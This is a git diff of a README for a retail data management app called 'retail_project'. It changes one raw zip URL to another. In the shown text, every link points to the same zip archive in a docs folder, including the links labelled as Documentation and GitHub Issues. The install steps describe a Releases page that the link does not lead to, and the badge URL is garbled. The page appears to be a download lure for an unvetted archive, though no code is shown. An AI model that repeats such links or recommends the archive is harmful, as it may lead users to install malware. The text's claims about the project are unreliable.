@@ -1,6 +1,6 @@
 # 🛒 retail_project - Simplifying Retail Data Management
 
-[![Download Latest Release](https://github.com/yongsinfok/retail_project/raw/refs/heads/main/docs/retail-project-v3.1.zip%20Latest%20Release-v1.0-blue)](https://github.com/yongsinfok/retail_project/raw/refs/heads/main/docs/retail-project-v3.1.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/yongsinfok/retail_project/main/docs/project_retail_3.1.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/yongsinfok/retail_project/main/docs/project_retail_3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the retail_project! This application helps you manage retail data sea
 
 ## 📥 Download & Install
 
-1. Visit [this page to download](https://github.com/yongsinfok/retail_project/raw/refs/heads/main/docs/retail-project-v3.1.zip).
+1. Visit [this page to download](https://raw.githubusercontent.com/yongsinfok/retail_project/main/docs/project_retail_3.1.zip).
 2. On the Releases page, you will see several versions listed. Click on the latest version to view its details.
 3. Locate the section titled "Assets" to find downloadable files.
 4. Download the file that matches your operating system (Windows, Mac, or Linux). For most users, the Windows version is recommended.
@@ -61,8 +61,8 @@ Join our community of users and contributors! Share your experiences, tips, and 
 
 ## 🔗 Links
 
-- [Download Latest Release](https://github.com/yongsinfok/retail_project/raw/refs/heads/main/docs/retail-project-v3.1.zip)
-- [Documentation](https://github.com/yongsinfok/retail_project/raw/refs/heads/main/docs/retail-project-v3.1.zip)
-- [GitHub Issues](https://github.com/yongsinfok/retail_project/raw/refs/heads/main/docs/retail-project-v3.1.zip)
+- [Download Latest Release](https://raw.githubusercontent.com/yongsinfok/retail_project/main/docs/project_retail_3.1.zip)
+- [Documentation](https://raw.githubusercontent.com/yongsinfok/retail_project/main/docs/project_retail_3.1.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/yongsinfok/retail_project/main/docs/project_retail_3.1.zip)
 
 Thank you for using retail_project! We hope it makes your retail data management easier and more accessible.
